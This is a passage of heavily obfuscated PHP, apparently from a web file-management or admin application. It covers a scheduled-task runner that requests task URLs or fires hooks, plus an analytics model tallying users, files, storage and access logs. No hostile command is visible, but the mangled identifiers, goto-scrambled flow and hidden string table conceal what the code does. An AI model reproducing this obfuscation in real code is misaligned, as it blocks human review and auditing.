$FÙ·´ƒ¦„»); } private static function taskRunAll() { goto bùáäÒèÉÀ; fÎ”ö¶«Ë: $DÔò‹†Ïƒ = count($AµšÅƒ–); for ($d“õ‡Í£¡Ô = 0; $d“õ‡Í£¡Ô < $DÔò‹†Ïƒ; $d“õ‡Í£¡Ô++) { $FÚƒ‡ôó¹ = $AµšÅƒ–[$d“õ‡Í£¡Ô]; if (!$FÚƒ‡ôó¹[$cÛí‘—ã’ö[385]] || $FÚƒ‡ôó¹[$cÛí‘—ã’ö[1450]] != $cÛí‘—ã’ö[86]) { continue; } if (!self::taskTimeCheck($FÚƒ‡ôó¹)) { continue; } self::taskRun($FÚƒ‡ôó¹); } Hook::trigger($cÛí‘—ã’ö[1451]); goto Eñ°‹éªÍ‹; Eñ°‹éªÍ‹: self::taskQueueRun($B‘£½Ÿß®); self::closeDatabase(); goto eğÆ—õµÄ; bùáäÒèÉÀ: $cÛí‘—ã’ö =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B‘£½Ÿß® = timeFloat(); $AµšÅƒ– = Model($cÛí‘—ã’ö[1449])->listData(); goto fÎ”ö¶«Ë; eğÆ—õµÄ: } private static function taskQueueRun($Bèãº“ƒ÷) { $cÔöÁæØ… = 10; while (!0) { $A±İõ‡¡µ = TaskQueue::run(); if ($A±İõ‡¡µ === !1) { break; } if (timeFloat() - $Bèãº“ƒ÷ >= $cÔöÁæØ…) { break; } } } private static function taskTimeCheck($b©Ê¿Ã‚Ü) { goto DÍ¶ß÷òŸ²; B°¡Î±¢ÊÔ: switch ($dƒŠ œÀÛ[$eë¶ë»•[29]]) { case $eë¶ë»•[1458]: if (time() - $F›óï¿±Ö– < 3600 * 24 * 30) { return !1; } if ($dƒŠ œÀÛ[$eë¶ë»•[1458]] == date($eë¶ë»•[1459]) && $Dö„ƒóªŒ) { return !0; } break; case $eë¶ë»•[1460]: if (time() - $F›óï¿±Ö– < 3600 * 24 * 7) { return !1; } $Bä‚¤ïÚºƒ = date($eë¶ë»•[1461]) == 0 ? 7 : date($eë¶ë»•[1461]); if ($dƒŠ œÀÛ[$eë¶ë»•[1460]] == $Bä‚¤ïÚºƒ && $Dö„ƒóªŒ) { return !0; } break; case $eë¶ë»•[1453]: if (time() - $F›óï¿±Ö– < 3600 * 24) { return !1; } if ($Dö„ƒóªŒ) { return !0; } break; case $eë¶ë»•[1462]: if (time() - $F›óï¿±Ö– >= floatval($dƒŠ œÀÛ[$eë¶ë»•[1462]]) * 60) { return !0; } break; default: break; } return !1; goto d± §Š†Œ; Bµ“¡ŠÊß: $cöâĞ¯á›˜ = strtotime($eë¶ë»•[1452] . $dƒŠ œÀÛ[$eë¶ë»•[1453]] . $eë¶ë»•[1454]) - strtotime($eë¶ë»•[1455]); $bôµ¯ÙÌ•ß = time() - strtotime(date($eë¶ë»•[1456]) . $eë¶ë»•[1457]); $Dö„ƒóªŒ = $bôµ¯ÙÌ•ß >= $cöâĞ¯á›˜ && $bôµ¯ÙÌ•ß <= $cöâĞ¯á›˜ + 3600; goto B°¡Î±¢ÊÔ; DÍ¶ß÷òŸ²: $eë¶ë»• =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dƒŠ œÀÛ = json_decode($b©Ê¿Ã‚Ü[$eë¶ë»•[195]], !0); $F›óï¿±Ö– = intval($b©Ê¿Ã‚Ü[$eë¶ë»•[1443]]); goto Bµ“¡ŠÊß; d± §Š†Œ: } private static function closeDatabase() { goto C½¹ÅïÇßî; C½¹ÅïÇßî: $cß§à¹ÙËÑ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $EÙ²ÙŠˆçá = 0; $e‹­¢—Ÿ¡ = 1800; goto bóÀ¦é­; bóÀ¦é­: if (!$EÙ²ÙŠˆçá) { $EÙ²ÙŠˆçá = time(); } if (time() - $EÙ²ÙŠˆçá < $e‹­¢—Ÿ¡) { return; } $EÙ²ÙŠˆçá = time(); goto aÌ»ÑÂĞ; aÌ»ÑÂĞ: $dî‰«Ó›¬ = Model($cß§à¹ÙËÑ[492])->db($cß§à¹ÙËÑ[33]); if ($dî‰«Ó›¬) { $dî‰«Ó›¬->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($cß§à¹ÙËÑ[1463], $cß§à¹ÙËÑ[1464]); die; } goto f“¾¬¦Ê˜æ; f“¾¬¦Ê˜æ: } public static function taskRun($a±ğ¹ãğ¥×) { goto eª‡¸çâœï; eŒÀÖ¹: $D™Òè¨ã÷Š = timeFloat(); $cåáÕ¡á£ = $eÄñ„ğ¬“›[33]; switch ($a±ğ¹ãğ¥×[$eÄñ„ğ¬“›[29]]) { case $eÄñ„ğ¬“›[303]: $d¯›Å¶Œ£ƒ = url_request($a±ğ¹ãğ¥×[$eÄñ„ğ¬“›[1468]], $eÄñ„ğ¬“›[226], !1, !1, !1, !1, 5); $cåáÕ¡á£ = strlen($d¯›Å¶Œ£ƒ); break; case $eÄñ„ğ¬“›[225]: $cåáÕ¡á£ = Hook::apply($a±ğ¹ãğ¥×[$eÄñ„ğ¬“›[1468]]); default: break; } goto a’ğæ´Ôî; a’ğæ´Ôî: Model($eÄñ„ğ¬“›[1469])->add(array($eÄñ„ğ¬“›[1470] => $eÄñ„ğ¬“›[33], $eÄñ„ğ¬“›[1471] => $eÄñ„ğ¬“›[486], $eÄñ„ğ¬“›[29] => $eÄñ„ğ¬“›[1472] . $a±ğ¹ãğ¥×[$eÄñ„ğ¬“›[385]], $eÄñ„ğ¬“›[1473] => json_encode(array($eÄñ„ğ¬“›[28] => $a±ğ¹ãğ¥×[$eÄñ„ğ¬“›[28]], $eÄñ„ğ¬“›[1474] => timeFloat() - $D™Òè¨ã÷Š, $eÄñ„ğ¬“›[289] => $cåáÕ¡á£)))); self::log($eÄñ„ğ¬“›[1475] . $a±ğ¹ãğ¥×[$eÄñ„ğ¬“›[385]] . $eÄñ„ğ¬“›[1476] . $cåáÕ¡á£); return !0; goto bêø‹Í‹éù; eª‡¸çâœï: $eÄñ„ğ¬“› =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; self::log($eÄñ„ğ¬“›[1465] . $a±ğ¹ãğ¥×[$eÄñ„ğ¬“›[385]] . $eÄñ„ğ¬“›[1466] . $a±ğ¹ãğ¥×[$eÄñ„ğ¬“›[28]] . $eÄñ„ğ¬“›[1467] . $a±ğ¹ãğ¥×[$eÄñ„ğ¬“›[1468]]); Model($eÄñ„ğ¬“›[1449])->run($a±ğ¹ãğ¥×[$eÄñ„ğ¬“›[385]]); goto eŒÀÖ¹; bêø‹Í‹éù: } private static function valueGet($bÆµ¶¯ùŸ) { $e°î¥•»åñ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A‡¦Ã–³¿ = $e°î¥•»åñ[1477]; $a®—Ç”×¡ = Model($e°î¥•»åñ[1478])->get($bÆµ¶¯ùŸ, $A‡¦Ã–³¿); if (is_null($a®—Ç”×¡)) { Model($e°î¥•»åñ[1478])->set($e°î¥•»åñ[1447], 10, $A‡¦Ã–³¿); Model($e°î¥•»åñ[1478])->set($e°î¥•»åñ[683], $e°î¥•»åñ[86], $A‡¦Ã–³¿); Model($e°î¥•»åñ[1478])->set($e°î¥•»åñ[1442], $e°î¥•»åñ[486], $A‡¦Ã–³¿); $a®—Ç”×¡ = Model($e°î¥•»åñ[1478])->get($bÆµ¶¯ùŸ, $A‡¦Ã–³¿); } return $a®—Ç”×¡; } private static function valueSet($d­´ÕÉÏ’ä, $a÷ù´ÖÍ«ù) { $d„™Ùà¨ˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return Model($d„™Ùà¨ˆ[1478])->set($d­´ÕÉÏ’ä, $a÷ù´ÖÍ«ù, $d„™Ùà¨ˆ[1477]); } protected static function log($Fƒ‡¸„ ÛŒ) { write_log($Fƒ‡¸„ ÛŒ, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1464]); } private static function cacheClear() { $A¥í»™œ•Ö =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cÒÖ¥–µ = Model($A¥í»™œ•Ö[1478])->cacheKey($A¥í»™œ•Ö[1477]); Cache::clearMemory($cÒÖ¥–µ); Model($A¥í»™œ•Ö[1449])->cacheClear(); } } goto d´‘ĞãŒ‚¸; eåïõ‹¿›«: class AnalysisModel extends ModelBaseLight { public function init($c¨÷áôøé«) { $e˜ƒ í¯ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BôİŠá¹­¸ = array($e˜ƒ í¯[551] => array($e˜ƒ í¯[29] => $e˜ƒ í¯[1563], $e˜ƒ í¯[269] => array($e˜ƒ í¯[220], $e˜ƒ í¯[694], $e˜ƒ í¯[1564], $e˜ƒ í¯[1565])), $e˜ƒ í¯[1566] => array($e˜ƒ í¯[29] => $e˜ƒ í¯[1567], $e˜ƒ í¯[269] => array($e˜ƒ í¯[220], $e˜ƒ í¯[692], $e˜ƒ í¯[1568], $e˜ƒ í¯[1569], $e˜ƒ í¯[1570]))); if (!isset($BôİŠá¹­¸[$c¨÷áôøé«])) { return !1; } $this->optionType = $BôİŠá¹­¸[$c¨÷áôøé«][$e˜ƒ í¯[29]]; $this->field = $BôİŠá¹­¸[$c¨÷áôøé«][$e˜ƒ í¯[269]]; return !0; } public function listData($eÜ†ÍÛ˜‹ = false, $dŞÜƒ÷“Î = "\155\x6f\x64\x69\x66\x79\x54\x69\155\145", $e‹Í“ñÎêõ = false) { return parent::listData($eÜ†ÍÛ˜‹, $dŞÜƒ÷“Î, $e‹Í“ñÎêõ); } public function trendList($C—·Àˆî¤) { goto Eõ×ÅÍƒÀ; Eõ×ÅÍƒÀ: $FË¶ñ¬òß =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Eì¢Šİ² = $this->listData(); if ($Eì¢Šİ²) { $BÒó–›çÚ = end($Eì¢Šİ²); $eœ´Ò¦í± = date($FË¶ñ¬òß[1571], strtotime($FË¶ñ¬òß[1572])); if ($BÒó–›çÚ[$FË¶ñ¬òß[220]] == $eœ´Ò¦í±) { return $Eì¢Šİ²; } $A¸‡È©ŒˆÑ = strtotime($BÒó–›çÚ[$FË¶ñ¬òß[220]]); } goto B¼¦ç»ÀÖ×; Aµ¿æÇÄ•å: foreach ($DøŒ‘„ÏÎ¡ as $eœ´Ò¦í±) { $this->{$f—¥Î‚òÔè}($eœ´Ò¦í±); } return $this->listData(); goto c†­£Ş‹Ö›; B¼¦ç»ÀÖ×: if (!isset($A¸‡È©ŒˆÑ)) { $dëÃ‹ˆˆŒ¹ = $C—·Àˆî¤ == $FË¶ñ¬òß[551] ? $FË¶ñ¬òß[495] : $FË¶ñ¬òß[745]; $A¸‡È©ŒˆÑ = Model($dëÃ‹ˆˆŒ¹)->min($FË¶ñ¬òß[192]); } $f—¥Î‚òÔè = $FË¶ñ¬òß[1573] . ucfirst($C—·Àˆî¤); $DøŒ‘„ÏÎ¡ = $this->dateList($A¸‡È©ŒˆÑ); goto Aµ¿æÇÄ•å; c†­£Ş‹Ö›: } private function dateList($eÌËã´´·) { $eÌ …É¥– =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EÁë¼µùĞ = $eÌËã´´·; $C¹İƒ…ÛÀ = strtotime($eÌ …É¥–[1572]); $e´Šä¥óØÊ = array(); while ($EÁë¼µùĞ <= $C¹İƒ…ÛÀ) { $e´Šä¥óØÊ[] = date($eÌ …É¥–[1571], $EÁë¼µùĞ); $EÁë¼µùĞ = strtotime($eÌ …É¥–[1574], $EÁë¼µùĞ); } return $e´Šä¥óØÊ; } public function _recordUser($E¢Â°ó©Æ = '') { goto cŒĞ™¯Àà; bøæÔõ°ƒô: $e×‰«½ƒøÆ = array($F§Æƒ£§Ó×[220] => $E¢Â°ó©Æ, $F§Æƒ£§Ó×[694] => (int) $e‘î…¹øÁ, $F§Æƒ£§Ó×[1564] => (int) $D³ÕÅàùŠ‘, $F§Æƒ£§Ó×[1565] => (int) $A´¿‚ƒ•†´); return $this->insert($e×‰«½ƒøÆ); goto fëˆ‰ëÁö´; cŒĞ™¯Àà: $F§Æƒ£§Ó× =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F«œ¿ñ¬öÈ = strtotime(date($F§Æƒ£§Ó×[1575], strtotime($E¢Â°ó©Æ))); $B‚æÙ‹„ø‚ = strtotime(date($F§Æƒ£§Ó×[1576], strtotime($E¢Â°ó©Æ))); goto C”öá¥Ä×; dÍİˆ‹íÊ: $D³ÕÅàùŠ‘ = Model($F§Æƒ£§Ó×[495])->where($Cç¥ôõ¸™)->count($F§Æƒ£§Ó×[1479]); $Cç¥ôõ¸™[$F§Æƒ£§Ó×[29]] = $F§Æƒ£§Ó×[1577]; $A´¿‚ƒ•†´ = Model($F§Æƒ£§Ó×[1578])->where($Cç¥ôõ¸™)->count($F§Æƒ£§Ó×[1579]); goto bøæÔõ°ƒô; C”öá¥Ä×: $Cç¥ôõ¸™ = array($F§Æƒ£§Ó×[192] => array($F§Æƒ£§Ó×[922], $B‚æÙ‹„ø‚)); $e‘î…¹øÁ = Model($F§Æƒ£§Ó×[495])->where($Cç¥ôõ¸™)->count($F§Æƒ£§Ó×[1479]); $Cç¥ôõ¸™[$F§Æƒ£§Ó×[192]] = array($F§Æƒ£§Ó×[329], array($F«œ¿ñ¬öÈ, $B‚æÙ‹„ø‚)); goto dÍİˆ‹íÊ; fëˆ‰ëÁö´: } public function _recordStore($d‘Œö†¸ãÚ = '') { goto Bìù”“«ÕÊ; e¿ˆÚÖåÁ†: $Dé©§Â­ö”[$d‰³·ÁĞŞæ[389]] = 1; $dêÓ“‰ = Model($d‰³·ÁĞŞæ[745])->where($Dé©§Â­ö”)->sum($d‰³·ÁĞŞæ[77]); $Dé©§Â­ö”[$d‰³·ÁĞŞæ[389]] = 2; goto föí¾±’‘†; Bìù”“«ÕÊ: $d‰³·ÁĞŞæ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F»Æ›ÏŒËì = strtotime(date($d‰³·ÁĞŞæ[1576], strtotime($d‘Œö†¸ãÚ))); $Dé©§Â­ö” = array($d‰³·ÁĞŞæ[192] => array($d‰³·ÁĞŞæ[922], $F»Æ›ÏŒËì)); goto B‚¼¬Ö´Õ; B‚¼¬Ö´Õ: $AË—»öÒÓŒ = Model($d‰³·ÁĞŞæ[439])->where($Dé©§Â­ö”)->sum($d‰³·ÁĞŞæ[77]); $Dé©§Â­ö”[$d‰³·ÁĞŞæ[388]] = 0; $f‚ïæŒªÄ¿ = Model($d‰³·ÁĞŞæ[745])->where($Dé©§Â­ö”)->sum($d‰³·ÁĞŞæ[77]); goto e¿ˆÚÖåÁ†; föí¾±’‘†: $b‚íæ½¸´ó = Model($d‰³·ÁĞŞæ[745])->where($Dé©§Â­ö”)->sum($d‰³·ÁĞŞæ[77]); $bÕğŞÉã¦ô = array($d‰³·ÁĞŞæ[220] => $d‘Œö†¸ãÚ, $d‰³·ÁĞŞæ[692] => (int) $f‚ïæŒªÄ¿, $d‰³·ÁĞŞæ[1568] => (int) $AË—»öÒÓŒ, $d‰³·ÁĞŞæ[1569] => (int) $dêÓ“‰, $d‰³·ÁĞŞæ[1570] => (int) $b‚íæ½¸´ó); return $this->insert($bÕğŞÉã¦ô); goto d’ßµ‰‹; d’ßµ‰‹: } public function trend($eÃáŞ©–¤ê, $d›èŠ·Äíš) { goto dÁŒèİ÷º¬; dÔêó²î»Š: if (empty($Aè¾³ÖÒ¸)) { $c©ƒ—á‰¿ = date($c™Ò¨É·Å×[1571], strtotime($c™Ò¨É·Å×[1572])); $B›µ‰ğ„ = array($c™Ò¨É·Å×[220] => $c©ƒ—á‰¿); foreach ($FÚó“ÉµŒŒ[$eÃáŞ©–¤ê] as $cÁ¹ÖÚÌ™î => $FÅè°´çš) { $B›µ‰ğ„[$cÁ¹ÖÚÌ™î] = 0; } $Aè¾³ÖÒ¸[] = $B›µ‰ğ„; } $eãå¬Ş’Ì = array(); foreach ($Aè¾³ÖÒ¸ as $FÅè°´çš) { if ($eÃáŞ©–¤ê == $c™Ò¨É·Å×[1566] && $FÅè°´çš[$c™Ò¨É·Å×[1568]] > $FÅè°´çš[$c™Ò¨É·Å×[692]]) { $FÅè°´çš[$c™Ò¨É·Å×[1568]] = $FÅè°´çš[$c™Ò¨É·Å×[692]]; } foreach ($FÚó“ÉµŒŒ[$eÃáŞ©–¤ê] as $cÁ¹ÖÚÌ™î => $E˜íºèÜğ‚) { $AÎÑÇ¢˜… = array($c™Ò¨É·Å×[220] => $FÅè°´çš[$c™Ò¨É·Å×[220]], $c™Ò¨É·Å×[1384] => $E˜íºèÜğ‚); $AÎÑÇ¢˜…[$eß‚“Ë›…[$eÃáŞ©–¤ê]] = isset($FÅè°´çš[$cÁ¹ÖÚÌ™î]) ? $FÅè°´çš[$cÁ¹ÖÚÌ™î] : 0; $eãå¬Ş’Ì[] = $AÎÑÇ¢˜…; } } goto aÊìøÃ¦Š; bß²¹óÛÕ˜: if ($Aè¾³ÖÒ¸ && $d›èŠ·Äíš != $c™Ò¨É·Å×[1453]) { $EŠî…¾îÒâ = $Aè¾³ÖÒ¸[0][$c™Ò¨É·Å×[220]]; $F­ÉÁŒ‹ª® = $this->validDate($d›èŠ·Äíš, $EŠî…¾îÒâ); $f¶•°èâ‰ = array(); $A÷š›™ª° = array_to_keyvalue($Aè¾³ÖÒ¸, $c™Ò¨É·Å×[220]); foreach ($F­ÉÁŒ‹ª® as $c©ƒ—á‰¿) { if (isset($A÷š›™ª°[$c©ƒ—á‰¿])) { $AÎÑÇ¢˜… = $A÷š›™ª°[$c©ƒ—á‰¿]; } else { $AÎÑÇ¢˜… = end($Aè¾³ÖÒ¸); $AÎÑÇ¢˜…[$c™Ò¨É·Å×[220]] = $c©ƒ—á‰¿; if ($eÃáŞ©–¤ê == $c™Ò¨É·Å×[551]) { $AÎÑÇ¢˜…[$c™Ò¨É·Å×[1564]] = $AÎÑÇ¢˜…[$c™Ò¨É·Å×[1565]] = 0; } } $f¶•°èâ‰[] = $AÎÑÇ¢˜…; } $Aè¾³ÖÒ¸ = $f¶•°èâ‰; } $FÚó“ÉµŒŒ = array($c™Ò¨É·Å×[551] => array($c™Ò¨É·Å×[694] => LNG($c™Ò¨É·Å×[1580]), $c™Ò¨É·Å×[1564] => LNG($c™Ò¨É·Å×[1581]), $c™Ò¨É·Å×[1565] => LNG($c™Ò¨É·Å×[1582])), $c™Ò¨É·Å×[1566] => array($c™Ò¨É·Å×[692] => LNG($c™Ò¨É·Å×[1583]), $c™Ò¨É·Å×[1568] => LNG($c™Ò¨É·Å×[1584]), $c™Ò¨É·Å×[1569] => LNG($c™Ò¨É·Å×[1585]), $c™Ò¨É·Å×[1570] => LNG($c™Ò¨É·Å×[1586]))); $eß‚“Ë›… = array($c™Ò¨É·Å×[551] => $c™Ò¨É·Å×[1587], $c™Ò¨É·Å×[1566] => $c™Ò¨É·Å×[77]); goto dÔêó²î»Š; aÊìøÃ¦Š: return $eãå¬Ş’Ì; goto f»·™Õ‡¯Ë; dÁŒèİ÷º¬: $c™Ò¨É·Å× =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->init($eÃáŞ©–¤ê)) { return !1; } $Aè¾³ÖÒ¸ = $this->trendList($eÃáŞ©–¤ê); goto bß²¹óÛÕ˜; f»·™Õ‡¯Ë: } public function validDate($C±Ò‡§ßÀ, $c§Ú²ÚßŠÖ) { goto eÏ†ĞµÑê÷; eÏ†ĞµÑê÷: $E„õß«Í =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Bˆ…ê­ÔÇÅ = date($E„õß«Í[1571], strtotime($E„õß«Í[1572])); $d‡§¾æÌ‚ˆ = array($Bˆ…ê­ÔÇÅ); goto C¦õÀëÚÛ; eõÉêšÛßã: return $d‡§¾æÌ‚ˆ; goto F£í‚½„°÷; C¦õÀëÚÛ: switch ($C±Ò‡§ßÀ) { case $E„õß«Í[1460]: $b¯Àõ…»½” = mktime(0, 0, 0, date($E„õß«Í[1588]), date($E„õß«Í[1203]) - date($E„õß«Í[1265]) + 7 - 7, date($E„õß«Í[1589])); $cß‹¹±”§¤ = 0; do { $c†ô­²íÚ… = date($E„õß«Í[1571], $b¯Àõ…»½” - 3600 * 24 * 7 * $cß‹¹±”§¤); $d‡§¾æÌ‚ˆ[] = $c†ô­²íÚ…; $cß‹¹±”§¤++; } while ($c§Ú²ÚßŠÖ < $c†ô­²íÚ…); break; case $E„õß«Í[1458]: $cß‹¹±”§¤ = 1; do { $c¦æÇÈßĞª = date($E„õß«Í[1590], strtotime("\x2d\40{$cß‹¹±”§¤}\x20\x6d\x6f\156\164\150\163")); $d‡§¾æÌ‚ˆ[] = $c¦æÇÈßĞª; $cß‹¹±”§¤++; } while ($c§Ú²ÚßŠÖ < $c¦æÇÈßĞª); break; case $E„õß«Í[1591]: $Ašéáš‹ = (int) date($E„õß«Í[1589], strtotime($c§Ú²ÚßŠÖ)); $bø¢é‰å­ò = (int) date($E„õß«Í[1589]); if ($Ašéáš‹ >= $bø¢é‰å­ò) { break; } for ($Ašéáš‹; $Ašéáš‹ < $bø¢é‰å­ò; $Ašéáš‹++) { $d‡§¾æÌ‚ˆ[] = $Ašéáš‹ . $E„õß«Í[1592]; } break; default: break; } if ($c§Ú²ÚßŠÖ > end($d‡§¾æÌ‚ˆ)) { array_pop($d‡§¾æÌ‚ˆ); } sort($d‡§¾æÌ‚ˆ); goto eõÉêšÛßã; F£í‚½„°÷: } public function listTable($Dòå´Ö‡„Ÿ) { $cĞÖ„ƒº = ucfirst($Dòå´Ö‡„Ÿ); return Model($cĞÖ„ƒº)->listData(); } public function option($C†À›İòˆ) { $cÓëŠƒ•Ğã = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1593] . ucfirst($C†À›İòˆ); return $this->{$cÓëŠƒ•Ğã}(); } private function optionUser() { goto fŠèôËÁ; fŠèôËÁ: $Eˆğ¶¸»Á¹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D‘¶÷ ¹Ä… = Model($Eˆğ¶¸»Á¹[495])->count($Eˆğ¶¸»Á¹[1479]); $E…¦™Í ÃÍ = Model($Eˆğ¶¸»Á¹[495])->where($Eˆğ¶¸»Á¹[1594])->count($Eˆğ¶¸»Á¹[1479]); goto E¦ºÇÊÎ®Ø; CŒÒ‹Ì£ˆ™: if (!$dï®¾•Æ…÷) { $dï®¾•Æ…÷ = 1; } $FØß²Ğ†«Â = strtotime(date($Eˆğ¶¸»Á¹[1575])); $Dã×˜ñÔ¤Ä = array($Eˆğ¶¸»Á¹[1596] => array($Eˆğ¶¸»Á¹[923], $FØß²Ğ†«Â)); goto b›†ˆˆÚë; E¦ºÇÊÎ®Ø: $FØß²Ğ†«Â = strtotime($Eˆğ¶¸»Á¹[1595]); $Dã×˜ñÔ¤Ä = array($Eˆğ¶¸»Á¹[1596] => array($Eˆğ¶¸»Á¹[923], $FØß²Ğ†«Â)); $dï®¾•Æ…÷ = (int) Model($Eˆğ¶¸»Á¹[495])->where($Dã×˜ñÔ¤Ä)->count($Eˆğ¶¸»Á¹[1479]); goto CŒÒ‹Ì£ˆ™; b›†ˆˆÚë: $fƒÑ¢£‚˜Ù = Model($Eˆğ¶¸»Á¹[495])->where($Dã×˜ñÔ¤Ä)->count($Eˆğ¶¸»Á¹[1479]); return array($Eˆğ¶¸»Á¹[689] => (int) $D‘¶÷ ¹Ä…, $Eˆğ¶¸»Á¹[1597] => (int) ($D‘¶÷ ¹Ä… - $E…¦™Í ÃÍ), $Eˆğ¶¸»Á¹[1598] => (int) $E…¦™Í ÃÍ, $Eˆğ¶¸»Á¹[1599] => (int) $fƒÑ¢£‚˜Ù, $Eˆğ¶¸»Á¹[1600] => $dï®¾•Æ…÷); goto AˆŠöË”; AˆŠöË”: } private function optionFile() { goto cØÀç´ª¿Æ; B‡Å©£Ÿñ: $C•§ÍåÕ = Model($Däé•¦·ª[745])->where($A¸³ç•¥ß)->sum($Däé•¦·ª[77]); $D‘ÊÒÔŒå˜ = Model($Däé•¦·ª[745])->where($A¸³ç•¥ß)->count($Däé•¦·ª[387]); return array($Däé•¦·ª[692] => $E©©Éœ«ôŸ, $Däé•¦·ª[1568] => $BÃªÈö®‘, $Däé•¦·ª[1601] => $E©©Éœ«ôŸ - $BÃªÈö®‘, $Däé•¦·ª[1602] => (int) $C•§ÍåÕ, $Däé•¦·ª[694] => (int) $Cã‡Ú«‹Á, $Däé•¦·ª[1603] => (int) $D‘ÊÒÔŒå˜); goto DŠËĞÒÒ‡; cØÀç´ª¿Æ: $Däé•¦·ª =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fİ­²¡â‘ = $this->sourceSize(); $E©©Éœ«ôŸ = $fİ­²¡â‘[$Däé•¦·ª[77]]; goto AÀ¡®çãÕ†; AÀ¡®çãÕ†: $BÃªÈö®‘ = $fİ­²¡â‘[$Däé•¦·ª[1568]]; $Cã‡Ú«‹Á = Model($Däé•¦·ª[745])->where(array($Däé•¦·ª[388] => 0))->count($Däé•¦·ª[387]); $A¸³ç•¥ß = array($Däé•¦·ª[388] => 0, $Däé•¦·ª[192] => array($Däé•¦·ª[923], strtotime(date($Däé•¦·ª[1575])))); goto B‡Å©£Ÿñ; DŠËĞÒÒ‡: } private function optionAccess() { $d­¡Õƒ£¦ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return array($d­¡Õƒ£¦[689] => $this->typeLogCnt(), $d­¡Õƒ£¦[106] => $this->typeLogCnt($d­¡Õƒ£¦[106]), $d­¡Õƒ£¦[421] => $this->typeLogCnt($d­¡Õƒ£¦[421]), $d­¡Õƒ£¦[1604] => $this->typeLogCnt($d­¡Õƒ£¦[1604]), $d­¡Õƒ£¦[1605] => $this->typeLogCnt($d­¡Õƒ£¦[1605]), $d­¡Õƒ£¦[551] => $this->typeLogCnt($d­¡Õƒ£¦[33], $d­¡Õƒ£¦[1579])); } private function typeLogCnt($c¸›ƒ©Ô¤ = '', $FÊ²—ƒİˆ = "\151\x64") { goto C¹Ğø°êˆ¾; eçêŒ¯¤£: $a«ø›£ô’¾ = array($fôÛ˜ƒŞ÷ô[192] => array($fôÛ˜ƒŞ÷ô[923], $a‡ìœŠòÎš)); if ($c¸›ƒ©Ô¤) { $a«ø›£ô’¾[$fôÛ˜ƒŞ÷ô[29]] = array($fôÛ˜ƒŞ÷ô[7], $C‡ƒİëì¯[$c¸›ƒ©Ô¤]); } $C¥ÙÅÊ•š– = Model($fôÛ˜ƒŞ÷ô[1578])->where($a«ø›£ô’¾)->count($FÊ²—ƒİˆ); goto A°¼ÔÜ—; C¹Ğø°êˆ¾: $fôÛ˜ƒŞ÷ô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C‡ƒİëì¯ = array($fôÛ˜ƒŞ÷ô[106] => array($fôÛ˜ƒŞ÷ô[1606], $fôÛ˜ƒŞ÷ô[1607]), $fôÛ˜ƒŞ÷ô[421] => array($fôÛ˜ƒŞ÷ô[1608], $fôÛ˜ƒŞ÷ô[1609]), $fôÛ˜ƒŞ÷ô[1604] => array($fôÛ˜ƒŞ÷ô[1610], $fôÛ˜ƒŞ÷ô[1611], $fôÛ˜ƒŞ÷ô[1612]), $fôÛ˜ƒŞ÷ô[1605] => array($fôÛ˜ƒŞ÷ô[1613], $fôÛ˜ƒŞ÷ô[1614]), $fôÛ˜ƒŞ÷ô[1615] => array($fôÛ˜ƒŞ÷ô[1616], $fôÛ˜ƒŞ÷ô[1617], $fôÛ˜ƒŞ÷ô[1618])); $a‡ìœŠòÎš = strtotime(date($fôÛ˜ƒŞ÷ô[1575])); goto eçêŒ¯¤£; A°¼ÔÜ—: return (int) $C¥ÙÅÊ•š–; goto BùÓÂ„ëœ¹; BùÓÂ„ëœ¹: } private function optionServer() { goto fŠ˜ƒİ†‚…; cŸ›«Ó½Š·: if ($f—…×ñÌ„¾ == $f±†’ãù²Ğ[717]) { $CÇÖù´İ = explode($f±†’ãù²Ğ[1114], $f­ØŒ¤ñ•[$f±†’ãù²Ğ[883]]); $f—…×ñÌ„¾ = $CÇÖù´İ[0]; } if ($f—…×ñÌ„¾ == $f±†’ãù²Ğ[720] || $f—…×ñÌ„¾ == $f±†’ãù²Ğ[721]) { $fíÔÂø‘£¸ = Model()->db()->query($f±†’ãù²Ğ[1619]); $eÓßÔÔÏê™ = $fíÔÂø‘£¸[0] && isset($fíÔÂø‘£¸[0][$f±†’ãù²Ğ[1383]]) ? $fíÔÂø‘£¸[0][$f±†’ãù²Ğ[1383]] : 0; $f—…×ñÌ„¾ = $f±†’ãù²Ğ[1620] . ($eÓßÔÔÏê™ ? $f±†’ãù²Ğ[8] . $eÓßÔÔÏê™ : $f±†’ãù²Ğ[33]); } $CĞ†æÂàŸ = $GLOBALS[$f±†’ãù²Ğ[6]][$f±†’ãù²Ğ[345]][$f±†’ãù²Ğ[747]]; goto DÙ»é½‹»à; C“Ğº²×‘±: $aõ‚¹Ù“…ä = $a²²©‚‡“Š[0]; $f­ØŒ¤ñ• = $GLOBALS[$f±†’ãù²Ğ[6]][$f±†’ãù²Ğ[17]]; $f—…×ñÌ„¾ = $f­ØŒ¤ñ•[$f±†’ãù²Ğ[884]]; goto cŸ›«Ó½Š·; DÙ»é½‹»à: return array($f±†’ãù²Ğ[1621] => $c¶¦‡‹‘ë ? $c¶¦‡‹‘ë[$f±†’ãù²Ğ[1622]] : 0, $f±†’ãù²Ğ[1623] => $c¶¦‡‹‘ë ? $c¶¦‡‹‘ë[$f±†’ãù²Ğ[1624]] : 0, $f±†’ãù²Ğ[1625] => (int) $AÏµÒ°ˆÒ[$f±†’ãù²Ğ[1622]] * 1024 * 1024 * 1024, 